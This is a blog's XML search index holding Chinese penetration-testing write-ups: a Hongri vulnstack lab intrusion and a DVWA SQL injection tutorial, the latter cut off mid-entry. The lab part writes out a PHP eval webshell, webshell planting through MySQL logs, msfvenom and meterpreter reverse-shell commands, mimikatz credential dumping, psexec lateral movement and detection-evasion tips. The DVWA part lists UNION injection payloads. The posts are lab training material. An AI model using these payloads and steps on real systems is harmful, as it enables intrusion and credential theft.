<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>123</title>
      <link href="/2023/07/02/123/123/"/>
      <url>/2023/07/02/123/123/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场(一)</title>
      <link href="/2023/07/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E4%B8%80)/"/>
      <url>/2023/07/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p> 一. 环境搭建</p><ol><li>实验环境拓扑如下：</li></ol><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img"></p><ol start="2"><li>下载好镜像文件，下载地址: <a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a> (13G，需要百度网盘会员)</li></ol><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="img"></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" alt="img"></p><ol start="3"><li>需要模拟内网和外网两个网段， Win7 虚拟机相当于网关服务器，所以需要两张网卡，一个用来向外网提供web服务，一个是通向内网。添加网络设配器如下图</li></ol><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image008.jpg" alt="img"></p><p>将 Win7 的网络适配器 1 设置成 VMnet1 仅主机模式（内网），网络适配器 2 设置成 NAT 模式（外网）</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg" alt="img"></p><p>而 Win2003、Win2008 网络适配器设置成VMnet1仅主机模式(内网)。</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image014.jpg" alt="img"></p><p>网络配置完成，这三台虚拟主机默认开机密码都是 hongrisec@2019（开机提示密码已过期，更改为 123qwe.即可）登录查看三台虚拟机的ip地址如下：</p><p>windows7：(内：192.168.52.143 &#x2F; 外：192.168.44.134(外网根据你的物理机进行分配))</p><p>windows2003：(内：192.168.52.141)</p><p>windows2008:（内：192.168.52.138）</p><p>开机之后更新一下Vmware TOOls</p><p>更新之前</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg" alt="img"></p><p>更新之后</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg" alt="img"></p><p>最后在 Win7 外网服务器主机的 C 盘找到 PhpStudy 启动 Web 服务</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg" alt="img"></p><p>靶场的环境搭建完毕</p><p>二．Web渗透</p><p>1.信息收集</p><p>(1)我们使用nmap进行扫描 nmap -T4 -A 192.168.44.134(nmap的使用-A:全面扫描 -T4: 快速扫描)</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg" alt="img"></p><p>扫描工具很多，能不能扫出有用信息还是看字典是否强大，可以看到目标80端口开启，3306端口开放</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image024.jpg" alt="img"></p><p>(2)我们访问<a href="http://192.168.44.134/phpmyadmin%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0">http://192.168.44.134/phpmyadmin，可以看到数据库管理后台</a></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image026.jpg" alt="img"></p><p>我们猜测用户名和密码是root root，可以看到登录成功</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image028.jpg" alt="img"></p><p>(3)我们尝试into outfile写入木马进行getshell，想在网站内部写入木马，需要知道网站的绝对路径，可以通过报错获取路径，用select @@basedir;查询，通过查询phpinfo.php等等多种方法，这里我们使用select @@basedir;进行查询。</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg" alt="img"></p><p>(4)然后通过执行select ‘<? php eval($_POST[pass]);?>’into outfile ‘C:&#x2F;phpStudy&#x2F;www&#x2F;webshell.php’;(注意这里的符号都是英文状态，不然会报错)将木马写入到网站的根目录</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image032.jpg" alt="img"></p><p>我们可以看到写入失败，通过查询得知这里不能使用into outfile的方式写入shell，可以通过执行“show variables like ‘%secure_file%’;”查询下是否能直接写入shell。这里secure_file_priv的值为NULL，说明不能使用into outfile的方式写入shell。</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image034.jpg" alt="img"></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image036.jpg" alt="img"></p><p>(5) 尝试日志写入shell</p><p>查看日志状态：show variables like ‘%general%’,我们可以看到是关闭的</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image038.jpg" alt="img"></p><p>这里我们说一下general_log和general_log_file：</p><p>mysql打开general_log开关之后，所有对数据库的操作都将记录在general_log_file指定的文件目录中，以原始的状态来显示，如果将general_log开关打开，general_log_file指定一个php文件，则查询的操作将会全部写入到general_log_file指定的文件，可以通过访问general_log_file指定的文件来获取webshell。</p><p>开启日志记录：set global general_log &#x3D; “ON”;再查询日志状态，是开启的</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image040.jpg" alt="img"></p><p>(6)执行命令：set global general_log_file&#x3D;‘C:&#x2F;phpStudy&#x2F;www&#x2F;web.php’，指定日志写入到网站根目录的 web.php 文件.</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image042.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image044.jpg" alt="img"></p><p>访问日志文件</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image046.jpg" alt="img"></p><p>(7)我们连接蚁剑(使用蚁剑的时候，记得关闭杀毒软件)，密码是pass，我们可以看到连接成功</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image048.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image050.jpg" alt="img"></p><p>\2. WEB后台上传GetShell</p><p>(1)在我们目录扫描中，还扫到了我们的网站备份源码</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image052.jpg" alt="img"></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image054.jpg" alt="img"></p><p>(2) 我们搭建yxcms 系统，浏览器访问<a href="http://192.168.44.134/yxcms/">http://192.168.44.134/yxcms/</a></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image056.jpg" alt="img"></p><p>我们根据提示成功进入网站后台</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image058.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image060.jpg" alt="img"></p><p>(3) 可以新建一个木马文件，前台模块-管理模块文档-新建</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image062.jpg" alt="img"></p><p>我们可以看到文件已上传，可通过前面下载的beifen.rar文件来查找acomment.php文件来确定文件上传的路径：</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image064.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image066.jpg" alt="img"></p><p>(4) 蚁剑成功连接</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image068.jpg" alt="img"></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image070.jpg" alt="img"></p><p>(5) 留言板处存在xss漏洞：</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image072.jpg" alt="img"></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image074.jpg" alt="img"><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image076.jpg" alt="img"><br>三. 内网信息收集</p><p>\1. 使用CS植入Backdoor</p><p>(1)我们在kali或者Windows里面安装CS,我们在kali里面启动CS，我们需要开2个终端</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image078.jpg" alt="img"></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image080.jpg" alt="img"></p><p>(2) 先新建监听，主机IP填写kali的ip</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image082.jpg" alt="img"></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image084.jpg" alt="img"></p><p>(3)我们生成后门</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image086.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image088.jpg" alt="img"></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image090.jpg" alt="img"></p><p>(4)生成后，使用蚁剑进行上传到靶机</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image092.jpg" alt="img"></p><p>(5) 上传后使用蚁剑中使用终端命令行执行start web.exe, 可以看到我们 CS 客户端靶机上线</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image094.jpg" alt="img"></p><p>(6) 我们进行提权到 SYSTEM 系统权限账户。</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image096.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image098.jpg" alt="img"></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image100.jpg" alt="img"></p><p>2.信息收集</p><p>(1) 由于受害机默认60秒进行一次回传，为了实验效果我们这里把时间设置成5，但实际中频率不宜过快，容易被发现。</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image102.jpg" alt="img"></p><p>(2) 开始简单进行信息收集，常用到的有以下</p><p>ipconfig &#x2F;all  查看本机ip，所在域</p><p>route print   打印路由信息</p><p>net view    查看局域网内其他主机名</p><p>arp -a     查看arp缓存</p><p>whoami</p><p>net start    查看开启了哪些服务</p><p>net share    查看开启了哪些共享</p><p>net share ipc$ 开启ipc共享</p><p>net share c$  开启c盘共享</p><p>net use \192.168.xx.xx\ipc$ “” &#x2F;user:””  与192.168.xx.xx建立空连接</p><p>net use \192.168.xx.xx\c$ “密码” &#x2F;user:”用户名” 建立c盘共享</p><p>dir \192.168.xx.xx\c$\user  查看192.168.xx.xx c盘user目录下的文件</p><p>net config Workstation  查看计算机名、全名、用户名、系统版本、工作站、域、登录域</p><p>net user         查看本机用户列表</p><p>net user &#x2F;domain     查看域用户</p><p>net localgroup administrators  查看本地管理员组（通常会有域用户）</p><p>net view &#x2F;domain     查看有几个域</p><p>net user 用户名 &#x2F;domain  获取指定域用户的信息</p><p>net group &#x2F;domain    查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</p><p>net group 组名 &#x2F;domain  查看域中某工作组</p><p>net group “domain admins” &#x2F;domain 查看域管理员的名字</p><p>net group “domain computers” &#x2F;domain 查看域中的其他主机名</p><p>net group “doamin controllers” &#x2F;domain 查看域控制器（可能有多台）</p><p>(3) 使用ipconfig &#x2F;all 判断是否存在域, 可以看到存在gob.org域</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image104.jpg" alt="img"></p><p>也可以执行命令net config Workstation 来查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image106.jpg" alt="img"></p><p>(4) 获取域内用户的详细信息：wmic useraccount get &#x2F;all</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image108.jpg" alt="img"></p><p>(5) 查看是否存在杀毒进程：tasklist</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image110.jpg" alt="img"></p><p>除了使用CS外，我们也可以使用msf进入操作。</p><p>3.msf</p><p>(1)使用msf生成shell.exe</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image112.jpg" alt="img"></p><p>(2) 将shell.exe使用蚁剑上传到web服务器中。msf开启监听</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image114.jpg" alt="img"></p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 192.168.44.130</p><p>set lport 6666</p><p>exploit</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image116.jpg" alt="img"></p><p>我们可以看到没有反弹成功，我们换一个端口4444</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image118.jpg" alt="img"></p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.44.130 LPORT&#x3D;4444 -f exe -o door.exe</p><p>(3) 运行door.exe，msf成功反弹shell</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image120.jpg" alt="img"></p><p>(4) msf中getsystem也可直接提权</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image122.jpg" alt="img"></p><p>（5）MSF使用_MSF中kiwi(mimikatz)模块的使用</p><p>1) 首先:提权到system权限：</p><p>一是当前的权限是administrator用户；</p><p>二是利用其它手段先提权到administrator用户。然后administrator用户可以直接在meterpreter_shell中使用命令getsystem提权到system权限。 </p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image124.jpg" alt="img"></p><p>2)进程迁移</p><p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。</p><p>所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。</p><p>查看进程信息:ps</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image126.jpg" alt="img"></p><p>把进程迁移到PID为504这个程序中(因为当前用户)：</p><p>注：因为目标系统是64位的所以需要把meterpreter进程迁移到一个64位程序的进程中。</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image128.jpg" alt="img"></p><p>load kiwi #加载kiwi模块</p><p>help kiwi #查看kiwi模块的使用</p><p>creds_all：       #列举所有凭据</p><p>creds_kerberos：    #列举所有kerberos凭据</p><p>creds_msv：       #列举所有msv凭据</p><p>creds_ssp：       #列举所有ssp凭据</p><p>creds_tspkg：      #列举所有tspkg凭据</p><p>creds_wdigest：     #列举所有wdigest凭据</p><p>dcsync：        #通过DCSync检索用户帐户信息</p><p>dcsync_ntlm：      #通过DCSync检索用户帐户NTLM散列、SID和RID</p><p>golden_ticket_create： #创建黄金票据</p><p>kerberos_ticket_list： #列举kerberos票据</p><p>kerberos_ticket_purge： #清除kerberos票据</p><p>kerberos_ticket_use：  #使用kerberos票据</p><p>kiwi_cmd：       #执行mimikatz的命令，后面接mimikatz.exe的命令</p><p>lsa_dump_sam：     #dump出lsa的SAM</p><p>lsa_dump_secrets：   #dump出lsa的密文</p><p>password_change：    #修改密码</p><p>wifi_list：       #列出当前用户的wifi配置文件</p><p>wifi_list_shared：   #列出共享wifi配置文件&#x2F;编码</p><p>3)该命令可以列举系统中的明文密码: creds_all #列举所有凭据</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image130.jpg" alt="img"></p><p>四. 内网横向渗透</p><p> 利用MSF横向渗透可以使用cs和MSF两种方式进行横向渗透。这里以CS作为演示。(2008,2003可以使用永恒之蓝进行)</p><p>1.第一步就是生成exe，然后拿到shell(上面已经讲过)</p><p>2.进行目标主机信息收集</p><p>3.横向探测</p><p>(1)获取到一个 cs 的 beacon 后可以目标内网情况和端口开放情况</p><p>在 beacon 上右键 -&gt; 目标 -&gt; 选择 net view 或者 port scan</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image132.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image134.jpg" alt="img"></p><p>(2). 执行后可以在 Targets 选项卡看到扫描出来的主机</p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image136.jpg" alt="img"></p><p>(3). 用 cs 的 hashdump 读内存密码：hashdump，用 mimikatz 读注册表密码：logonpasswords</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image138.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image140.jpg" alt="img"></p><p><img src="C:/Users/%E5%AE%9D%E5%AE%9D/AppData/Local/Temp/msohtmlclip1/01/clip_image142.jpg" alt="img"></p><p>4.横向移动#</p><p>这里有很多种方式，可以：</p><p>1.)cs 上开通 socks 通道，在攻击机上用 proxychains 将攻击机的 msf 代入内网，但是 cs 的 socks 代理不稳定</p><p>2.)ew 添加转接隧道，在攻击机上用 proxychains 将攻击机的 msf 代入内网</p><p>3.)cs 派生到 msf，msf 使用 socks4a 代理进内网，但是并不稳定</p><p>4.)cs 派生到 msf，msf 使用使用 autoroute 添加路由进内网</p><p>5.)用 frp 创建 socks5 代理</p><p>5.SMB Beacon</p><p>另外这里还要介绍下 cs 派生 SMB Beacon</p><p>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效</p><p>简单来说，SMB Beacon 有两种方式</p><p>第一种直接派生一个孩子，目的为了进一步盗取内网主机的 hash</p><p>1)新建一个 Listener，payload 设置为 Beacon SMB：</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image144.jpg" alt="img"></p><p>2)选择后会反弹一个子会话，在 external 的 ip 后面会有一个链接的小图标：</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image146.jpg" alt="img"></p><p>这就是派生的 SMB Beacon，当前没有连接</p><p>可以在主 Beacon 上用 link host 连接它，或者 unlink host 断开它</p><p>第二种在已有的 beacon 上创建监听，用来作为跳板进行内网穿透</p><p>前提是能够通过 shell 之类访问到内网其他主机</p><p>\6. psexec使用凭证登录其他主机</p><p>前面横向探测已经获取到内网内的其他 Targets 以及读取到的凭证信息</p><p>于是可以尝试使用 psexec 模块登录其他主机</p><p>1)右键选择一台非域控主机 ROOT-TVI862UBEH 的 psexec 模块</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image148.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image150.jpg" alt="img"></p><p>2)执行效果如下:</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image152.jpg" alt="img"></p><ol start="3"><li>这几条命令，执行后得到了 ROOT-TVI862UBEH 这台主机的 beacon</li></ol><p>如法炮制得到了域控主机 OWA 的 beacon:</p><p><img src="https://raw.githubusercontent.com/zb423/img/main/img/clip_image154.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红日靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA之SQL注入</title>
      <link href="/2023/06/30/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/06/30/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>一.DVWA介绍<br>1.1 DVWA简介</p><p>DVWA是一款基于PHP和MYSQL开发的web靶场练习平台，集成了常见的web漏洞如sql注入,XSS，密码破解等常见漏洞。旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。<br>1.2 DVWA模块</p><p>DVWA共有十个模块：</p><pre><code>Brute Force（暴力（破解））Command Injection（命令行注入）CSRF（跨站请求伪造）File Inclusion（文件包含）File Upload（文件上传）Insecure CAPTCHA （不安全的验证码）SQL Injection（SQL注入）SQL Injection（Blind）（SQL盲注）XSS（Reflected）（反射型跨站脚本）</code></pre><p>XSS（Stored）（存储型跨站脚本）<br>1.3 DVWA 安全级别</p><p>一般情况下，DVWA一共有四种安全级别，分别为：</p><p>Low、Medium、High、Impossible<br>二.DVWA的搭建<br>2.1 phpstudy的搭建</p><p>phpstudy下载地址小皮面板(phpstudy) - 让天下没有难配的服务器环境！ (xp.cn)</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205245426.png" alt="image-20230629205245426"></p><p>下载完后双击压缩包中的应用程序</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205404031.png" alt="image-20230629205404031"></p><p>选择路径，这里我存储在D盘中</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205415401.png" alt="image-20230629205415401"></p><p>然后就安装成功了</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205437881.png" alt="image-20230629205437881"></p><p>2.2DVWA的搭建</p><p><a href="https://raw.githubusercontent.com/zb423/image/main/image-20230629205445441.png">DVWA的官网DVWA - 该死的易受攻击的Web应用程序</a></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205445441.png" alt="image-20230629205445441"></p><p> 将其解压到PHPstudy路径下的PHPTutorial下的WWW目录下</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205507944.png" alt="image-20230629205507944"></p><p>解压后进入DVWA下的config文件打开config.inc.php文件</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205525004.png" alt="image-20230629205525004"></p><p>将p@ssw0rd 修改为 root </p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205537239.png" alt="image-20230629205537239"></p><p>然后在浏览器中访问<a href="http://127.0.0.1/DVWA-master/setup.php,%E7%84%B6%E5%90%8E%E7%82%B9%E5%87%BB%E7%BD%91%E7%AB%99%E4%B8%8B%E6%96%B9%E7%9A%84Create/Reset">http://127.0.0.1/DVWA-master/setup.php,然后点击网站下方的Create/Reset</a> Database按钮</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205548769.png" alt="image-20230629205548769"></p><p> 接着会跳转到DVWA的登录页面默认用户名：admin 默认密码：password 成功登录</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205600337.png" alt="image-20230629205600337"></p><p> 三.SQL注入漏洞<br>3.1 SQL注入原理</p><p>  就是通过把恶意的sql命令插入web表单递交给服务器，或者输入域名或页面请求的查询字符串递交到服务器，达到欺骗服务器，让服务器执行这些恶意的sql命令，从而让攻击者，可以绕过一些机制，达到直接访问数据库的一种攻击手段。<br>3.2 SQL注入分类</p><p>(1)数字型        （2）字符型       （3）报错注入     （4）Boollean注入                （5）时间注入<br>3.3 SQL注入思路</p><p>(1).判断是否存在注入，注入是字符型还是数字型</p><p>(2).猜解SQL查询语句中的字段数</p><p>(3).确定回显位置</p><p>(4).获取当前数据库</p><p>(5).获取数据库中的表</p><p>(6).获取表中的字段名</p><p>(7).得到数据<br>3.4 SQL注入绕过方法</p><p>(1)注释符号绕过         (2)大小写绕过         (3)内联注释绕过</p><p>(4)特殊编码绕过         (5)空格过滤绕过       (6)过滤or and xor not 绕过<br>四.SQL注入漏洞的分析<br>4.1 定义</p><p>SQL注入（SQLi）是一种注入攻击，可以执行恶意SQL语句。它通过将任意SQL代码插入数据库查询，使攻击者能够完全控制Web应用程序后面的数据库服务器。攻击者可以使用SQL注入漏洞绕过应用程序安全措施；可以绕过网页或Web应用程序的身份验证和授权，并检索整个SQL数据库的内容；还可以使用SQL注入来添加，修改和删除数据库中的记录。<br>4.2 原因</p><p>SQL 注入漏洞存在的原因，就是拼接SQL参数。也就是将用于输入的查询参数，直接拼接在SQL语句中，导致了SQL注入漏洞。</p><p>web 开发人员无法保证所有的输入都已经过滤</p><p>攻击者利用发送给服务器的输入参数构造可执行的 SQL 代码（可加入到 get 请求、 post 谓求、 http 头信思、 cookie 中）</p><p>数据库未做相应的安全配置</p><p>五.SQL Injection<br>1.low级别</p><p>(1)判断注入类型，是数字型注入，还是字符型注入</p><p>我们输入1，看到正确返回值</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205620389.png" alt="image-20230629205620389"></p><p> 我们输入1’，看到报错了</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205627463.png" alt="image-20230629205627463"></p><p> 我们可以猜出到是字符型注入，我们继续输入1’ and ‘1’ &#x3D;’1和1’ and ‘1’&#x3D;’2。</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205634464.png" alt="image-20230629205634464"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205654928.png" alt="image-20230629205654928"> </p><p>我们根据id&#x3D;1’报错和id&#x3D;1’ and ‘1’&#x3D;’1正确，我们可以知道是字符型注入，查看源代码知道就是字符型注入。</p><p>(2)判断字段数                                     order by </p><p>我们使用order by 进行判断字段数， 至到order by 进行报错时候就是字段数</p><p>id&#x3D;1’ order by 1#没有报错</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205708287.png" alt="image-20230629205708287"></p><p> id&#x3D;1’ order by 2# 没有报错</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205719159.png" alt="image-20230629205719159"></p><p> id&#x3D;1’ order by 3#时报错了，说明字段只有2列</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205728020.png" alt="image-20230629205728020"></p><p>(3)判断回显位置                       union select 1,2#</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205737176.png" alt="image-20230629205737176"></p><p> 可以知道回显位置 在这二个地方</p><p>(4)判断数据库                                     union select 1,database()#</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205749705.png" alt="image-20230629205749705"></p><p>(5)获取表名          1’  union select 1,group_concat(table_name) from information_schema.tables where 获取字段名 tables_schema&#x3D;database()#</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205758634.png" alt="image-20230629205758634"></p><p> (6)获取字段名                  1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205805006.png" alt="image-20230629205805006"></p><p>(7)获取数据    1’ union select user,password from users # </p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205811845.png" alt="image-20230629205811845"></p><p> 2.medium级别</p><p>(1)判断注入类型     我们可以看到无法输入数字，所以我们进行抓包在bp中进行SQL注入</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230629205820686.png" alt="image-20230629205820686"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630090846100.png" alt="image-20230630090846100"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630091906777.png" alt="image-20230630091906777"></p><p>我们输入id&#x3D;1’ and ‘1’&#x3D;’1看见报错了，输入id&#x3D;1 and 1&#x3D;1没有报错。</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630091916153.png" alt="image-20230630091916153"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630091922774.png" alt="image-20230630091922774"> </p><p>所以注入类型为数字类型 </p><p>(2)判断列数</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630091932131.png" alt="image-20230630091932131"></p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630091938170.png" alt="image-20230630091938170"></p><p> 我们知道列数为2列</p><p>（3）判断回显位置   </p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630091954566.png" alt="image-20230630091954566"></p><p>我们可以知道回显位置是2</p><p>(4)判断数据库</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092002267.png" alt="image-20230630092002267"></p><p>（5）判断表名</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092008882.png" alt="image-20230630092008882"></p><p> (6)判断列名</p><p><img src="https://raw.githubusercontent.com/zb423/image/main/image-20230630092016164.png" 